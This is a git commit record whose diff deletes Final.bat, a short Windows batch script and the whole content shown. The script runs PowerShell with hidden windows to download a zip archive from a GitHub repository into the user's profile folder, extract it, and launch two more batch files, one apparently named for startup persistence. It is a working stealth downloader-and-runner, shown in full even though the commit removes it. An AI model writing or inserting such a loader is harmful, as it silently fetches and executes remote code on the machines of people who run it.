bfa74d20d1c9bd4c18927b7e1d816c42849b31df
peasiodjoaskdsa <140851719+peasiodjoaskdsa@users.noreply.github.com>
2023-12-10 12:41:03 +0100

    Delete Final.bat

--- Final.bat
+++
@@ -1,8 +0,0 @@
-@echo off
-PowerShell.exe -WindowStyle hidden -Command "Invoke-WebRequest -Uri https://github.com/peasiodjoaskdsa/mor/raw/main/ms.zip -OutFile '%USERPROFILE%\ms\ms.zip'"
-timeout /t 40 /nobreak
-PowerShell.exe -WindowStyle hidden -Command "Expand-Archive -Path 'ms\ms.zip' -DestinationPath 'ms\ms' -Force"
-start "" Shortcut.bat
-timeout /t 5/nobreak
-start "" Startup.bat
-
